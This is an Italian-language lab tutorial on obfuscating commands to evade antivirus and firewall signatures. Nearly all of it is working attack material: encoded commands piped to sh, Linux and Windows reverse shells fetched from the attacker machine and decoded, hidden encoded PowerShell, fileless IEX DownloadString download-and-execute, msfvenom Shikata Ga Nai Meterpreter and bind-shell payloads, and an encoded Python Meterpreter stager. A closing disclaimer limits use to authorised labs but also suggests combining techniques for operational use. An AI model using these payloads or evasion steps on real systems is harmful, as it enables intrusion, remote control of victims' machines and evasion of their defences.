# Command Obfuscation 

## Indice

- Introduzione
- Preparazione dell'ambiente di lavoro
- Tecniche di offuscamento base
- Strumento unificato converter.py
- Reverse shell Linux offuscata
- Reverse shell Windows offuscata
- pwrshift.py per l'offuscamento PowerShell
- Shikata Ga Nai l'encoder polimorfico

---

## Introduzione

L'offuscamento dei comandi è una tecnica utilizzata per eludere i filtri statici di firewall, sistemi di monitoraggio e software antivirus. L'obiettivo è trasformare un comando leggibile in una forma che non venga riconosciuta da firme statiche ma che mantenga intatta la funzionalità originale.

Questa pratica non rende il comando invisibile ma permette di superare controlli superficiali. In ambienti con sistemi di protezione avanzati come EDR (Endpoint Detection and Response) l'offuscamento da solo potrebbe non essere sufficiente e andrebbe combinato con altre tecniche.

---

## Preparazione dell'ambiente di lavoro

Per seguire questa guida è necessario un ambiente di laboratorio composto dalle seguenti macchine virtuali:

| Macchina | Ruolo | Indirizzo IP |
|----------|-------|--------------|
| Kali Linux | Attaccante | 192.168.23.128 |
| Lubuntu | Vittima Linux | 192.168.23.133 |
| Windows 10 | Vittima Windows | 192.168.23.130 |

La directory di lavoro su Kali sarà `~/Desktop/obfuscation_lab`. Tutti i file generati verranno salvati in questa cartella.

---

## Tecniche di offuscamento base

Le tecniche seguenti mostrano come offuscare un semplice comando come `whoami`. Per ogni tecnica viene mostrato il comando per generare la versione offuscata su Kali e il comando per eseguirla sulla macchina vittima.

### Base64

La codifica Base64 trasforma i dati in un formato testuale utilizzando un set di 64 caratteri ASCII.

**Generazione su Kali:**

```
echo -n "whoami" | base64
```

L'output sarà `d2hvYW1p`.

**Esecuzione su Lubuntu:**

```
base64 -d <<< d2hvYW1p | sh
```

---

### Esadecimale (Hex)

La codifica esadecimale rappresenta ogni byte del comando con due caratteri esadecimali.

**Generazione su Kali:**

```
echo -n "whoami" | xxd -p
```

L`output sarà `77686f616d69`.

**Esecuzione su Lubuntu:**

```
echo "77686f616d69" | xxd -r -p | sh
```

---

### Decimale

La codifica decimale rappresenta ogni byte del comando con il suo corrispondente valore ASCII.

**Generazione su Kali:**

```
echo -n "whoami" | od -An -td1 | tr -s ` ` ` ` | sed `s/^ //`
```

L'output sarà `119 104 111 97 109 105`.

**Esecuzione su Lubuntu:**

```
echo "119 104 111 97 109 105" | awk `{for(i=1;i<=NF;i++) printf "%c", $i}` | sh
```

---

### Ottale

La codifica ottale rappresenta ogni byte del comando con il suo valore ottale.

**Generazione su Kali:**

```
echo -n "whoami" | od -An -to1 | tr -s ` ` ` ` | sed `s/^ //`
```

L'output sarà `167 150 157 141 155 151`.

**Esecuzione su Lubuntu:**

```
printf `\167\150\157\141\155\151` | sh
```

---

### Binario

La codifica binaria rappresenta ogni byte del comando come sequenza di otto bit.

**Generazione su Kali:**

```
echo -n "whoami" | perl -ne `print join(" ", map { sprintf("%08b", ord($_)) } split //), "\n"`
```

L'output sarà `01110111 01101000 01101111 01100001 01101101 01101001`.

**Esecuzione su Lubuntu:**

```
echo "01110111 01101000 01101111 01100001 01101101 01101001" | perl -lape `$_=pack"(B8)*",@F` | sh
```

---

## Strumento unificato converter.py

`converter.py` è uno script Python che genera automaticamente tutte le codifiche di un comando in un'unica esecuzione.

**Utilizzo:**

```
python3 converter.py
```

Il programma chiederà di inserire un testo e mostrerà tutte le codifiche disponibili:

```
========================================
   CONVERTITORE MULTI-FORMATO PRO
========================================
Inserisci il testo e premi Invio.
Premi CTRL+C per chiudere il programma.

ASCII > whoami
  [Base64]:  d2hvYW1p
  [Hex]:     77686f616d69
  [Decimale]: 119 104 111 97 109 105
  [Ottale]:   167 150 157 141 155 151
  [Binario]:  01110111 01101000 01101111 01100001 01101101 01101001
----------------------------------------
```

Questo strumento è utile per test rapidi e per comprendere le relazioni tra le diverse codifiche.

---

## Reverse shell Linux offuscata

Per offuscare una reverse shell Linux utilizzeremo lo script `implant.sh` che stabilisce una connessione verso l'attaccante utilizzando una named pipe (FIFO).

### Offuscamento con Base64

**Terminale 1 su Kali - Listener:**

```
sudo nc -lvnp 443
```

**Terminale 2 su Kali - Generazione del payload:**

```
cd ~/Desktop/obfuscation_lab
cat implant.sh | base64 -w 0 > implant.b64
sudo python3 -m http.server 80
```

**Sulla macchina Lubuntu:**

```
wget http://192.168.23.128/implant.b64
base64 -d implant.b64 | sh
```

**Verifica:** Sul terminale del listener su Kali dovrebbe apparire la shell della vittima.

---

### Offuscamento con Hex

**Terminale 1 su Kali - Listener:**

```
sudo nc -lvnp 443
```

**Terminale 2 su Kali - Generazione del payload:**

```
cd ~/Desktop/obfuscation_lab
xxd -p implant.sh | tr -d `\n` > implant.hex
sudo python3 -m http.server 80
```

**Sulla macchina Lubuntu:**

```
wget http://192.168.23.128/implant.hex
xxd -r -p implant.hex | sh
```

**Verifica:** Sul terminale del listener su Kali dovrebbe apparire la shell della vittima.

---

## Reverse shell Windows offuscata

Per offuscare una reverse shell Windows utilizzeremo lo script `Invoke-PowerShellReverse.ps1` che stabilisce una connessione PowerShell verso l'attaccante.

### Offuscamento con Base64

Questo metodo converte l'intero script PowerShell in formato UTF-16LE (richiesto da PowerShell per la codifica Base64) e poi in Base64.

**Terminale 1 su Kali - Listener:**

```
sudo nc -lvnp 443
```

**Terminale 2 su Kali - Generazione del payload:**

```
cd ~/Desktop/obfuscation_lab
iconv -f UTF-8 -t UTF-16LE Invoke-PowerShellReverse.ps1 | base64 -w 0 > encoded_full.ps1
cat encoded_full.ps1
```

Verrà visualizzata una lunga stringa Base64. Copiatela integralmente.

**Sulla macchina Windows 10 (PowerShell come amministratore):**

```
powershell -w hidden -nop -e STRINGA_BASE64_COMPLETA
```

**Verifica:** Sul terminale del listener su Kali dovrebbe apparire la shell PowerShell.

---

## pwrshift.py per l'offuscamento PowerShell

`pwrshift.py` è uno script progettato per codificare comandi singoli PowerShell in Base64, evitando il carattere `=` nel risultato. A differenza del metodo manuale mostrato sopra, questo strumento è pensato per comandi one-liner e non per script interi.

### Perché utilizzare pwrshift.py

La vera utilità di questo strumento risiede nella possibilità di eseguire comandi in modalità fileless, ovvero senza scrivere file sul disco della vittima. Questo approccio aiuta a eludere molti antivirus che controllano i file scritti su disco.

### Utilizzo base

```
python3 pwrshift.py "whoami"
```

**Output:**

```
[+] whoami... -> powershell -w hidden -nop -e d2hvYW1p
```

**Esecuzione su Windows**

```
powershell -w hidden -nop -e d2hvYW1p
```

### Esempi pratici

**Ottenere informazioni di sistema:**

```
python3 pwrshift.py "Get-Process | Select-Object -First 5"
```

**Scaricare ed eseguire un file:**

```
python3 pwrshift.py "Invoke-WebRequest -Uri http://192.168.23.128/payload.exe -OutFile C:\Temp\payload.exe; Start-Process C:\Temp\payload.exe"
```

**Esecuzione fileless di uno script remoto:**

```
python3 pwrshift.py "IEX (New-Object Net.WebClient).DownloadString(`http://192.168.23.128/script.ps1`)"
```

Quest'ultimo esempio è particolarmente interessante perché lo script viene scaricato ed eseguito direttamente in memoria senza essere mai scritto su disco.

### Utilizzo con file

```
# Creare un file con più comandi
echo "whoami" > commands.txt
echo "Get-Process" >> commands.txt
echo "Get-Service | Select-Object -First 3" >> commands.txt

# Codificare tutti i comandi
python3 pwrshift.py -f commands.txt -o encoded.txt
```

---

## Shikata Ga Nai l'encoder polimorfico

Shikata Ga Nai è un encoder polimorfico disponibile in Metasploit. A differenza delle tecniche di codifica statiche viste in precedenza, Shikata Ga Nai genera una firma diversa ogni volta che viene eseguito, rendendo il payload molto più difficile da rilevare.

### Come funziona

Shikata Ga Nai opera in tre fasi:

1. I byte del payload vengono sottoposti a XOR con un numero casuale chiamato vettore di inizializzazione
2. Il vettore di inizializzazione e il codice del decoder vengono inclusi nel payload finale
3. Quando il payload viene eseguito, il decoder ricostruisce il payload originale in memoria

### Linux - Meterpreter Reverse TCP

**Terminale 1 su Kali - Listener Metasploit:**

```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.23.128; set LPORT 443; exploit"
```

**Terminale 2 su Kali - Generazione del payload:**

```
cd ~/Desktop/obfuscation_lab
sudo msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.23.128 LPORT=443 --encoder x86/shikata_ga_nai -i 4 -f elf -o meterpreter_sgn
sudo python3 -m http.server 80
```

**Sulla macchina Lubuntu:**

```
wget http://192.168.23.128/meterpreter_sgn
chmod +x meterpreter_sgn
./meterpreter_sgn
```

**Verifica:** Sul terminale del listener su Kali dovrebbe apparire una sessione Meterpreter.

---

### Windows - Bind Shell

**Terminale 1 su Kali - Listener Metasploit:**

```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/shell/bind_tcp; set RHOST 192.168.23.130; set LPORT 4444; exploit"
```

**Terminale 2 su Kali - Generazione del payload:**

```
cd ~/Desktop/obfuscation_lab
sudo msfvenom -a x86 --platform windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai LPORT=4444 -f exe -o evil_sgn.exe
sudo python3 -m http.server 80
```

**Sulla macchina Windows 10:**

Aprire il browser e navigare a `http://192.168.23.128/evil_sgn.exe`. Scaricare il file ed eseguirlo.

**Verifica:** Sul terminale del listener su Kali dovrebbe apparire una shell Windows.

---

## Python - Meterpreter Reverse TCP

Il payload Python genera uno script che può essere eseguito su qualsiasi sistema dotato di Python (Linux, Windows, macOS).

**Generazione su Kali:**

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.23.128 LPORT=3456 > pyshell.py
```

**Contenuto del file generato (esempio):**

```python
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMO22y27ixVEPIiI4HoTWdpk1NA0DUlWq+J/d0MWLzO8N2/efOjRTT7iMMkBIv82uud9F6CpeYj+ICOPegT0Onk8Y22x7+wb0HLBtqiI/usYi9DmZpETrfgJ7x6u7/a7p8ebq3uWdEJO1oKMlJJyU4myWYtqKcpqTfiyXjUsiXoP3YAKmCW4mNzTeBEMgKMrhkybtxIH6zo5UHJ5S3gQHuQHrRl7Xrwg1Z6wYejzXRvABixV7MIc7dTZf/U80wzBDJKmw4UCOY3OQwg0/0D0TZ1IBUnJf0gg2/DL0B9wP19r')[0])))
```

**Listener su Kali:**

```bash
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST 192.168.23.128; set LPORT 3456; exploit"
```

**Sulla vittima (Lubuntu):**

```bash
wget http://192.168.23.128/pyshell.py
python3 pyshell.py
```

**Verifica su Kali:**

```
[*] Sending stage (34548 bytes) to 192.168.23.133
[*] Meterpreter session 1 opened (192.168.23.128:3456 -> 192.168.23.133:38900)
meterpreter >
```

---

## Note di sicurezza

> **⚠️ ATTENZIONE:** Questo materiale è a scopo puramente didattico e formativo.

Le tecniche descritte devono essere utilizzate esclusivamente in ambienti di laboratorio o su sistemi di cui si possiede esplicita autorizzazione scritta. L'utilizzo non autorizzato di queste tecniche su sistemi di terze parti costituisce un reato e viene perseguito dalla legge.

L'offuscamento da solo non garantisce l'evasione da sistemi di protezione moderni come gli EDR. Per una maggiore efficacia è consigliabile combinare più tecniche e testare sempre in ambienti isolati prima di qualsiasi utilizzo operativo.